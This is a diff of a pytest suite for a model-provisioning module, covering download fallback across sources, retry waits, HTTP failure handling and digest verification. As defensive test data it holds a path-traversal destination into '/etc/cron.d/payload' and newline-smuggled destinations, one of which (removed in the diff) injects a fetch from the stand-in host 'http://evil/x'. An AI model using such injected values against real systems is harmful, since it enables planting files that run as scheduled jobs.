@@ -1,16 +1,22 @@
 import hashlib
+import http.client
+import io
+from collections.abc import Callable
 from pathlib import Path
 
 import pytest
 
 from isekai.boundary.provision import (
+    ATTEMPTS,
+    WAITS,
     DigestMismatch,
     Entry,
+    HuggingFaceFetcher,
     Manifest,
     decide,
     digest_of,
+    fetch,
     land,
-    plan,
     verify,
 )
 from tests.fakes import FakeFetcher
@@ -34,6 +40,14 @@ def _entry(sources: list[str] | None = None) -> Entry:
 
 def _manifest(entries: list[Entry]) -> Manifest:
     return {"pinned": "2026-09-04", "publishers": [], "entries": entries}
+
+
+def _no_wait(seconds: float) -> None:
+    pass
+
+
+def _partial(target: Path) -> Path:
+    return target.with_name(f"{target.name}.partial")
 
 
 def _place(models_dir: Path, entry: Entry, payload: bytes) -> Path:
@@ -232,40 +246,174 @@ def test_a_source_rejected_before_transfer_is_absent_from_the_offered_sources(
 @pytest.mark.spec(
     "model-provisioning:source-fallback:the-plan-carries-every-surviving-source"
 )
-def test_the_plan_line_carries_the_whole_ordered_source_list(
+def test_fetch_walks_every_surviving_source_in_manifest_order(tmp_path: Path) -> None:
+    fetcher = FakeFetcher()
+    assert fetch(_manifest([_entry()]), tmp_path, fetcher, _no_wait) == 1
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY] * 3 + [ALTERNATE] * 3
+
+
+@pytest.mark.spec(
+    "model-provisioning:source-fallback:a-failed-transfer-advances-to-the-next-source"
+)
+def test_a_failed_transfer_advances_to_the_next_source(tmp_path: Path) -> None:
+    entry = _entry()
+    fetcher = FakeFetcher(served={ALTERNATE: PAYLOAD})
+    assert fetch(_manifest([entry]), tmp_path, fetcher, _no_wait) == 0
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY] * 3 + [ALTERNATE]
+    assert (tmp_path / entry["dest"]).read_bytes() == PAYLOAD
+
+
+@pytest.mark.spec(
+    "model-provisioning:source-fallback:a-failed-transfer-advances-to-the-next-source"
+)
+def test_bytes_that_do_not_verify_advance_to_the_next_source(tmp_path: Path) -> None:
+    entry = _entry()
+    fetcher = FakeFetcher(served={PRIMARY: b"tampered", ALTERNATE: PAYLOAD})
+    waits: list[float] = []
+    assert fetch(_manifest([entry]), tmp_path, fetcher, waits.append) == 0
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY, ALTERNATE]
+    assert waits == []
+    assert (tmp_path / entry["dest"]).read_bytes() == PAYLOAD
+
+
+@pytest.mark.spec(
+    "model-provisioning:source-fallback:a-failed-transfer-advances-to-the-next-source"
+)
+def test_fetch_fails_only_once_every_source_is_exhausted(
     tmp_path: Path, capsys: pytest.CaptureFixture[str]
 ) -> None:
     entry = _entry()
-    assert plan(_manifest([entry]), tmp_path, FakeFetcher()) == 0
+    fetcher = FakeFetcher(served={PRIMARY: b"tampered"})
+    assert fetch(_manifest([entry]), tmp_path, fetcher, _no_wait) == 1
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY] + [ALTERNATE] * 3
     target = tmp_path / entry["dest"]
-    assert capsys.readouterr().out.splitlines() == [
-        f"FETCH\t{target}\t{PRIMARY}\t{ALTERNATE}"
-    ]
+    assert not target.exists()
+    assert not _partial(target).exists()
+    assert f"every source for {target} failed" in capsys.readouterr().err
 
 
-@pytest.mark.spec_exempt("structural: the CLI surface the shell driver calls")
-def test_plan_reports_a_present_and_verified_entry_as_a_skip(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+@pytest.mark.spec("model-provisioning:source-fallback:a-broken-transfer-is-tried-again")
+def test_a_transfer_that_breaks_once_lands_from_the_same_source(
+    tmp_path: Path,
 ) -> None:
+    entry = _entry([PRIMARY])
+    fetcher = FakeFetcher(served={PRIMARY: PAYLOAD}, breaks={PRIMARY: 1})
+    waits: list[float] = []
+    assert fetch(_manifest([entry]), tmp_path, fetcher, waits.append) == 0
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY, PRIMARY]
+    assert waits == [10]
+    target = tmp_path / entry["dest"]
+    assert target.read_bytes() == PAYLOAD
+    assert not _partial(target).exists()
+
+
+@pytest.mark.spec("model-provisioning:source-fallback:a-broken-transfer-is-tried-again")
+def test_a_transfer_that_breaks_every_attempt_moves_to_the_next_source(
+    tmp_path: Path,
+) -> None:
+    entry = _entry()
+    fetcher = FakeFetcher(served={ALTERNATE: PAYLOAD})
+    waits: list[float] = []
+    assert fetch(_manifest([entry]), tmp_path, fetcher, waits.append) == 0
+    assert [url for url, _ in fetcher.fetched] == [PRIMARY] * 3 + [ALTERNATE]
+    assert waits == [10, 30]
+    assert (tmp_path / entry["dest"]).read_bytes() == PAYLOAD
+
+
+@pytest.mark.spec("model-provisioning:source-fallback:a-broken-transfer-is-tried-again")
+def test_every_attempt_after_the_first_has_its_wait() -> None:
+    # The budget is written twice; an attempt with no wait would raise mid-download.
+    assert len(WAITS) == ATTEMPTS - 1
+
+
+class _OfflineHuggingFace(HuggingFaceFetcher):
+    """The real `get` over a patched `urlopen`, with no pre-flight HEAD request."""
+
+    def published_digest(self, url: str) -> str | None:
+        return None
+
+
+class _BrokenBody(io.BytesIO):
+    """A response whose body ends mid-chunk, as `http.client` reports it."""
+
+    def read(self, size: int | None = -1) -> bytes:
+        raise http.client.IncompleteRead(b"partial")
+
+
+def _cut_body(url: str, timeout: float) -> io.BytesIO:
+    return _BrokenBody(b"")
+
+
+def _bad_status(url: str, timeout: float) -> io.BytesIO:
+    raise http.client.BadStatusLine("garbage")
+
+
+@pytest.mark.spec(
+    "model-provisioning:source-fallback:a-failed-transfer-advances-to-the-next-source"
+)
+@pytest.mark.parametrize("failure", [_cut_body, _bad_status])
+def test_an_http_layer_failure_advances_to_the_next_source(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    failure: Callable[[str, float], io.BytesIO],
+) -> None:
+    def urlopen(url: str, timeout: float) -> io.BytesIO:
+        return failure(url, timeout) if url == PRIMARY else io.BytesIO(PAYLOAD)
+
+    monkeypatch.setattr("urllib.request.urlopen", urlopen)
+    entry = _entry()
+    assert fetch(_manifest([entry]), tmp_path, _OfflineHuggingFace(), _no_wait) == 0
+    target = tmp_path / entry["dest"]
+    assert target.read_bytes() == PAYLOAD
+    assert not _partial(target).exists()
+
+
+class _BadStatusOpener:
+    """An opener whose HEAD request meets a malformed status line."""
+
+    def open(self, request: object, timeout: float) -> io.BytesIO:
+        raise http.client.BadStatusLine("garbage")
+
+
+@pytest.mark.spec(
+    "model-provisioning:source-fallback:a-failed-transfer-advances-to-the-next-source"
+)
+def test_an_http_layer_failure_on_the_head_request_still_lands_the_file(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(
+        "urllib.request.build_opener", lambda *handlers: _BadStatusOpener()
+    )
+    monkeypatch.setattr(
+        "urllib.request.urlopen", lambda url, timeout: io.BytesIO(PAYLOAD)
+    )
+    entry = _entry()
+    assert fetch(_manifest([entry]), tmp_path, HuggingFaceFetcher()) == 0
+    assert (tmp_path / entry["dest"]).read_bytes() == PAYLOAD
+
+
+@pytest.mark.spec(
+    "model-provisioning:byte-verification:a-present-file-is-verified-not-skipped"
+)
+def test_fetch_moves_no_byte_for_a_present_and_verified_file(tmp_path: Path) -> None:
     entry = _entry()
     _place(tmp_path, entry, PAYLOAD)
-    manifest = _manifest([entry])
-    assert plan(manifest, tmp_path, FakeFetcher()) == 0
-    target = tmp_path / entry["dest"]
-    assert capsys.readouterr().out.splitlines() == [f"SKIP\t{target}"]
+    fetcher = FakeFetcher()
+    assert fetch(_manifest([entry]), tmp_path, fetcher) == 0
+    assert fetcher.fetched == []
 
 
-@pytest.mark.spec_exempt("structural: the CLI surface the shell driver calls")
-def test_plan_exits_non_zero_before_emitting_any_transfer_when_an_entry_aborts(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
-) -> None:
+@pytest.mark.spec(
+    "model-provisioning:byte-verification:a-present-file-that-fails-is-not-deleted"
+)
+def test_fetch_moves_no_byte_when_any_entry_aborts(tmp_path: Path) -> None:
     bad = _entry()
-    _place(tmp_path, bad, b"somebody else's bytes")
+    placed = _place(tmp_path, bad, b"somebody else's bytes")
     absent: Entry = {**_entry(), "dest": "controlnet/other.onnx"}
-    assert plan(_manifest([bad, absent]), tmp_path, FakeFetcher()) == 1
-    captured = capsys.readouterr()
-    assert "FETCH" not in captured.out
-    assert bad["dest"] in captured.err
+    fetcher = FakeFetcher(served={PRIMARY: PAYLOAD})
+    assert fetch(_manifest([absent, bad]), tmp_path, fetcher) == 1
+    assert fetcher.fetched == []
+    assert placed.read_bytes() == b"somebody else's bytes"
 
 
 ESCAPES = "../../etc/cron.d/payload"
@@ -308,13 +456,14 @@ def test_an_escaping_destination_is_refused_before_the_pre_flight(
 @pytest.mark.spec(
     "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
 )
-def test_the_plan_line_carries_the_already_resolved_destination(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+def test_the_transfer_writes_beside_the_already_resolved_destination(
+    tmp_path: Path,
 ) -> None:
     entry = _entry([PRIMARY])
-    assert plan(_manifest([entry]), tmp_path, FakeFetcher()) == 0
+    fetcher = FakeFetcher(served={PRIMARY: PAYLOAD})
+    assert fetch(_manifest([entry]), tmp_path, fetcher) == 0
     target = tmp_path / entry["dest"]
-    assert capsys.readouterr().out.splitlines() == [f"FETCH\t{target}\t{PRIMARY}"]
+    assert fetcher.fetched == [(PRIMARY, _partial(target))]
 
 
 MALFORMED = [
@@ -381,11 +530,9 @@ def test_a_destination_resolving_to_the_models_root_itself_is_refused(
         assert dest in decision.reason
 
 
-# The plan protocol is line- and tab-delimited, so a destination carrying either
-# does not stay one field: this one ends the record and starts a second whose
-# target is absolute and whose URL never passes `PINNED_SOURCE`, because that
-# check lives in `decide` and an injected record bypasses `decide` entirely.
-SMUGGLED = "checkpoints/a.safetensors\nFETCH\t/etc/cron.d/payload\thttp://evil/x"
+# A destination carrying a newline smuggles a second, absolute path past the
+# containment rule if anything splits on lines.
+SMUGGLED = "checkpoints/a.safetensors\n/etc/cron.d/payload"
 
 
 @pytest.mark.spec(
@@ -395,19 +542,3 @@ def test_a_destination_carrying_whitespace_is_refused(tmp_path: Path) -> None:
     decision = decide({**_entry(), "dest": SMUGGLED}, tmp_path, FakeFetcher())
     assert decision.action == "abort"
     assert "does not resolve" in decision.reason
-
-
-@pytest.mark.spec(
-    "model-provisioning:immutable-pins:an-escaping-destination-is-refused"
-)
-def test_a_plan_line_that_would_not_stay_one_record_is_refused(
-    tmp_path: Path, capsys: pytest.CaptureFixture[str]
-) -> None:
-    # Defence in depth, against the half of the target the destination rule does
-    # not cover: `MODELS_DIR` is handed in by the shell, so the delimiter can
-    # arrive from the root rather than from the manifest.
-    models_dir = tmp_path / "models\nroot"
-    assert plan(_manifest([_entry([PRIMARY])]), models_dir, FakeFetcher()) == 1
-    captured = capsys.readouterr()
-    assert "FETCH" not in captured.out
-    assert "ERROR" in captured.err
